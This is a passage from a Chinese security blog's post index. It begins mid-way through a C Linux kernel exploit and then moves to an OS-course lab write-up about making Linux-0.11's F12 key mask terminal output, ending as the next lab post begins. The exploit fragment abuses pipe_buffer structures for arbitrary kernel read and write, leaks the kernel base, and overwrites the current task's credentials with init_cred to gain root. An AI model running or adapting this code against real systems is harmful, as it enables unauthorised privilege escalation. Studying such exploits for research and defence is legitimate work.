class="string">&#x27;m&#x27;</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    write(pipe_list[snd_victim_idx][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line">    write(pipe_list[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;change pipe_buffer down&quot;</span>);</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_idx || i == victim_idx || i == snd_orig_idx || i == snd_victim_idx || i == self_2nd_pipe_idx || i == self_3rd_pipe_idx)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_list[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,page_ptr);</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)&#123;</span><br><span class="line">            self_4th_pipe_idx = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                    self_4th_pipe_idx);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0xff0</span>;</span><br><span class="line"></span><br><span class="line">    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="number">3</span>;</span><br><span class="line">    evil_3rd_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;change pipe_buffer down&quot;</span>);</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_4th_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    vmemmap_base = (<span class="keyword">size_t</span>)info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        arbitrary_read_by_pipe((struct page *)(vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">uint64_t</span> *)buf &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((*(<span class="keyword">uint64_t</span> *)buf &amp; <span class="number">0xfff</span>) == <span class="number">0x0e0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            kernel_base = *(<span class="keyword">uint64_t</span> *)buf - <span class="number">0x0e0</span>;</span><br><span class="line">            kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span></span><br><span class="line">                    <span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">                    kernel_base, kernel_offset);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> parent_task, current_task;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking task_struct in memory...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> *comm_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> *point_buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> target[<span class="number">0x20</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(target, <span class="string">&quot;8888888888&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_NAME, target, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>)&#123;</span><br><span class="line">        errPrint(<span class="string">&quot;cannot set name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        arbitrary_read_by_pipe((struct page *)(vmemmap_base + i * <span class="number">0x40</span>), point_buf);</span><br><span class="line"></span><br><span class="line">        comm_addr = memmem(point_buf, <span class="number">0xf00</span>, target, <span class="number">0xd</span>);</span><br><span class="line">        <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>) &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>) &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000</span>))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            parent_task = comm_addr[<span class="number">-60</span>];</span><br><span class="line"></span><br><span class="line">            current_task = comm_addr[<span class="number">-54</span>] - <span class="number">2528</span>;</span><br><span class="line">            page_offset_base = (comm_addr[<span class="number">-54</span>] &amp; <span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;</span><br><span class="line">            page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">                    (struct page *)(vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">                    page_offset_base);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                    current_task);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> *tsk_buf;</span><br><span class="line">    <span class="keyword">uint64_t</span> init_task = <span class="number">0xffffffff83011200</span>+kernel_offset;</span><br><span class="line">    <span class="keyword">uint64_t</span> init_cred = <span class="number">0xffffffff8308c620</span>+kernel_offset;</span><br><span class="line">    <span class="keyword">uint64_t</span> init_nsproxy = <span class="number">0xffffffff8308c140</span>+kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>, init_nsproxy);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((struct page *)current_task_page, buf);</span><br><span class="line">    arbitrary_read_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">    tsk_buf[<span class="number">367</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">368</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">381</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((struct page *)current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">    arbitrary_write_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>),&amp;buf[<span class="number">512</span> * <span class="number">8</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    get_root();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/13/HIT-OSLab7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/13/HIT-OSLab7/" class="post-title-link" itemprop="url">HIT-OSLab7</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-11-13 13:50:05 / Modified: 13:51:18" itemprop="dateCreated datePublished" datetime="2023-11-13T13:50:05+08:00">2023-11-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3.7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>HIT-OSLab7</strong></p>
<p>实验目的：</p>
<ul>
<li>加深对操作系统设备管理基本原理的认识，了解键盘中断、扫描码等概念</li>
<li>通过实践掌握 Linux-0.11 对键盘终端和显示器终端的处理过程</li>
</ul>
<p>实验内容：</p>
<ul>
<li>本实验的基本内容是修改 Linux-0.11 的终端设备处理代码，对键盘输入和字符显示进行非常规的控制</li>
<li>在初始状态，一切如常，用户按一次 F12 后，把应用程序向终端输出所有字母都替换为 <code>*</code></li>
<li>再按一次 F12，又恢复正常</li>
<li>第三次按 F12，再进行输出替换，依此类推</li>
</ul>
<p><strong>实验过程</strong></p>
<p>终端设备是计算机系统中与用户交互的硬件设备，通常使用键盘和显示器来接收用户的输入和输出操作</p>
<p>在 Linux 系统中，每个终端设备都对应一个 <code>tty_struct</code> 结构体实例，用于存储该终端设备的状态、配置信息以及与终端相关的数据结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">termios</span> <span class="title">termios</span>;</span>		<span class="comment">/* 存储终端设备的属性 */</span></span><br><span class="line">	<span class="keyword">int</span> pgrp;				   <span class="comment">/* 存储该终端设备所属的进程组 */</span></span><br><span class="line">	<span class="keyword">int</span> stopped;			   <span class="comment">/* 表示该终端设备是否处于停止状态 */</span></span><br><span class="line">	<span class="keyword">void</span> (*write)(struct tty_struct *tty);	<span class="comment">/* 处理终端设备的写操作 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_queue</span> <span class="title">read_q</span>;</span>	<span class="comment">/* 存储终端设备的输入缓冲区(来自键盘输入的数据) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_queue</span> <span class="title">write_q</span>;</span>	<span class="comment">/* 存储终端设备的输出缓冲区(屏幕将会输出的数据) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_queue</span> <span class="title">secondary</span>;</span>	<span class="comment">/* 存储终端设备的次要缓冲区(来自网络或其他设备的输入数据) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_queue</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> data;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> head;			<span class="comment">/* 存储队列中的头指针 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> tail;			<span class="comment">/* 存储队列中的尾指针 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">proc_list</span>;</span>	<span class="comment">/* 指向一个任务结构体列表 */</span></span><br><span class="line">	<span class="keyword">char</span> buf[TTY_BUF_SIZE];		<span class="comment">/* 存储队列中的数据缓冲区 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>扫描码是指计算机在接收用户的输入时，将用户的输入转换为计算机能够理解的形式，在键盘上，每个键都对应一个唯一的扫描码，这个扫描码可以用来识别用户按下的是哪个键</p>
<p>在操作系统中，键盘中断通常是通过中断处理程序（Interrupt Handler）来实现的</p>
<ul>
<li>当用户按下键盘上的键时，计算机系统会向操作系统发送一个中断信号，操作系统接收到这个信号后，会调用相应的中断处理程序来处理这个中断事件</li>
</ul>
<p>下面是键盘中断的处理程序代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">keyboard_interrupt:</span><br><span class="line">	pushl %eax</span><br><span class="line">	pushl %ebx</span><br><span class="line">	pushl %ecx</span><br><span class="line">	pushl %edx</span><br><span class="line">	push %ds</span><br><span class="line">	push %es</span><br><span class="line">	movl $0x10,%eax /* eax中是扫描码 */</span><br><span class="line">	mov %ax,%ds</span><br><span class="line">	mov %ax,%es</span><br><span class="line">	xor %al,%al		</span><br><span class="line">	inb $0x60,%al</span><br><span class="line">	cmpb $0xe0,%al</span><br><span class="line">	je set_e0</span><br><span class="line">	cmpb $0xe1,%al</span><br><span class="line">	je set_e1</span><br><span class="line">	call key_table(,%eax,4) /* 调用键处理程序&quot;ker_table+eax*4&quot; */</span><br><span class="line">	movb $0,e0</span><br><span class="line">e0_e1:	inb $0x61,%al</span><br><span class="line">	jmp 1f</span><br><span class="line">1:	jmp 1f</span><br><span class="line">1:	orb $0x80,%al</span><br><span class="line">	jmp 1f</span><br><span class="line">1:	jmp 1f</span><br><span class="line">1:	outb %al,$0x61</span><br><span class="line">	jmp 1f</span><br><span class="line">1:	jmp 1f</span><br><span class="line">1:	andb $0x7F,%al</span><br><span class="line">	outb %al,$0x61</span><br><span class="line">	movb $0x20,%al</span><br><span class="line">	outb %al,$0x20</span><br><span class="line">	pushl $0</span><br><span class="line">	call do_tty_interrupt /* 将收到的数据复制成规范模式数据并存放在规范字符缓冲队列中 */</span><br><span class="line">	addl $4,%esp</span><br><span class="line">	pop %es</span><br><span class="line">	pop %ds</span><br><span class="line">	popl %edx</span><br><span class="line">	popl %ecx</span><br><span class="line">	popl %ebx</span><br><span class="line">	popl %eax</span><br><span class="line">	iret</span><br><span class="line">set_e0:	movb $1,e0</span><br><span class="line">	jmp e0_e1</span><br><span class="line">set_e1:	movb $2,e0</span><br><span class="line">	jmp e0_e1</span><br></pre></td></tr></table></figure>
<p>其中 <code>key_table</code> 存储有各个扫描码的处理程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">key_table:</span><br><span class="line">	.<span class="keyword">long</span> none,do_self,do_self,do_self	<span class="comment">/* 00-03 s0 esc 1 2 */</span></span><br><span class="line">	.<span class="keyword">long</span> do_self,do_self,do_self,do_self	<span class="comment">/* 04-07 3 4 5 6 */</span></span><br><span class="line">	.<span class="keyword">long</span> do_self,do_self,do_self,do_self	<span class="comment">/* 08-0B 7 8 9 0 */</span></span><br><span class="line">	.<span class="keyword">long</span> do_self,do_self,do_self,do_self	<span class="comment">/* 0C-0F + &#x27; bs tab */</span></span><br><span class="line">        ......</span><br><span class="line">	.<span class="keyword">long</span> func,func,func,func		<span class="comment">/* 3C-3F f2 f3 f4 f5 */</span></span><br><span class="line">	.<span class="keyword">long</span> func,func,func,func		<span class="comment">/* 40-43 f6 f7 f8 f9 */</span></span><br><span class="line">	.<span class="keyword">long</span> func,num,scroll,cursor		<span class="comment">/* 44-47 f10 num scr home */</span></span><br><span class="line">	.<span class="keyword">long</span> cursor,cursor,do_self,cursor	<span class="comment">/* 48-4B up pgup - left */</span></span><br><span class="line">	.<span class="keyword">long</span> cursor,cursor,do_self,cursor	<span class="comment">/* 4C-4F n5 right + end */</span></span><br><span class="line">	.<span class="keyword">long</span> cursor,cursor,cursor,cursor	<span class="comment">/* 50-53 dn pgdn ins del */</span></span><br><span class="line">	.<span class="keyword">long</span> none,none,do_self,func		<span class="comment">/* 54-57 sysreq ? &lt; f11 */</span></span><br><span class="line">	.<span class="keyword">long</span> func,none,none,none		<span class="comment">/* 58-5B f12 ? ? ? */</span></span><br><span class="line">        ......</span><br></pre></td></tr></table></figure>
<ul>
<li>我们可以发现 F12 会调用 <code>func</code> 函数</li>
</ul>
<p>核心思路就是添加一个 F12 标记位，我们可以选择将 <code>func</code> 替换为我们需要的函数，其目的是修改该标记位以记录用户是否输入了 F12</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> f12_key = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_f12_key</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	f12_key ^= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="keyword">long</span> change_f12_key,none,none,none		<span class="comment">/* 58-5B f12 ? ? ? */</span></span><br></pre></td></tr></table></figure>
<p>函数 <code>con_write</code> 用于将字符串写入终端设备：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">con_write</span><span class="params">(struct tty_struct * tty)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> nr;</span><br><span class="line">	<span class="keyword">char</span> c;</span><br><span class="line"></span><br><span class="line">	nr = CHARS(tty-&gt;write_q);</span><br><span class="line">	<span class="keyword">while</span> (nr--) &#123;</span><br><span class="line">		GETCH(tty-&gt;write_q,c);</span><br><span class="line">		<span class="keyword">switch</span>(state) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">if</span> (c&gt;<span class="number">31</span> &amp;&amp; c&lt;<span class="number">127</span>) &#123;</span><br><span class="line">					<span class="keyword">if</span> (x&gt;=video_num_columns) &#123;</span><br><span class="line">						x -= video_num_columns;</span><br><span class="line">						pos -= video_size_row;</span><br><span class="line">						lf();</span><br><span class="line">					&#125;</span><br><span class="line">                    <span class="comment">/* 将write_q的字符放入显存的汇编代码 */</span></span><br><span class="line">					__asm__(<span class="string">&quot;movb attr,%%ah\n\t&quot;</span></span><br><span class="line">						<span class="string">&quot;movw %%ax,%1\n\t&quot;</span></span><br><span class="line">						::<span class="string">&quot;a&quot;</span> (c),<span class="string">&quot;m&quot;</span> (*(<span class="keyword">short</span> *)pos)</span><br><span class="line">						);</span><br><span class="line">					pos += <span class="number">2</span>;</span><br><span class="line">					x++;</span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="number">27</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>其 <code>case 0</code> 用于处理 asicc 在 <code>(31,127)</code> 范围的字符</li>
<li>我们需要在这段代码前检查 <code>f12_key</code> 并将字符设置为 <code>*</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">con_write</span><span class="params">(struct tty_struct * tty)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> nr;</span><br><span class="line">	<span class="keyword">char</span> c;</span><br><span class="line"></span><br><span class="line">	nr = CHARS(tty-&gt;write_q);</span><br><span class="line">	<span class="keyword">while</span> (nr--) &#123;</span><br><span class="line">		GETCH(tty-&gt;write_q,c);</span><br><span class="line">		<span class="keyword">switch</span>(state) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">if</span> (c&gt;<span class="number">31</span> &amp;&amp; c&lt;<span class="number">127</span>) &#123;</span><br><span class="line">					<span class="keyword">if</span> (x&gt;=video_num_columns) &#123;</span><br><span class="line">						x -= video_num_columns;</span><br><span class="line">						pos -= video_size_row;</span><br><span class="line">						lf();</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(f12_key == <span class="number">1</span> &amp;&amp; ( (c &gt;= <span class="number">48</span> &amp;&amp; c&lt;= <span class="number">57</span>) || (c&gt;=<span class="number">65</span> &amp;&amp; c&lt;=<span class="number">90</span>) || (c&gt;=<span class="number">97</span> &amp;&amp; c&lt;=<span class="number">122</span>) ) )</span><br><span class="line">						c = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line"></span><br><span class="line">					__asm__(<span class="string">&quot;movb attr,%%ah\n\t&quot;</span></span><br><span class="line">						<span class="string">&quot;movw %%ax,%1\n\t&quot;</span></span><br><span class="line">						::<span class="string">&quot;a&quot;</span> (c),<span class="string">&quot;m&quot;</span> (*(<span class="keyword">short</span> *)pos)</span><br><span class="line">						);</span><br><span class="line">					pos += <span class="number">2</span>;</span><br><span class="line">					x++;</span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="number">27</span>)</span><br></pre></td></tr></table></figure>
<p>最终效果如下：</p>
<img src="/2023/11/13/HIT-OSLab7/1699854454074.png" class width="1699854454074">   

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/08/HIT-OSLab6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/08/HIT-OSLab6/" class="post-title-link" itemprop="url">HIT-OSLab6</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-11-08 18:47:50 / Modified: 18:49:34" itemprop="dateCreated datePublished" datetime="2023-11-08T18:47:50+08:00">2023-11-08</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>HIT-OSLab6</strong></p>
<p>实验目的：</p>
<ul>
<li>深入理解操作系统的段、页式内存管理，深入理解段表、页表、逻辑地址、线性地址、物理地址等概念</li>
<li>实现段、页式内存管理的地址映射过程</li>
<li>编程实现段、页式内存管理上的内存共享，从而深入理解操作系统的内存管理</li>
</ul>
<p>实验内容：</p>
<ul>
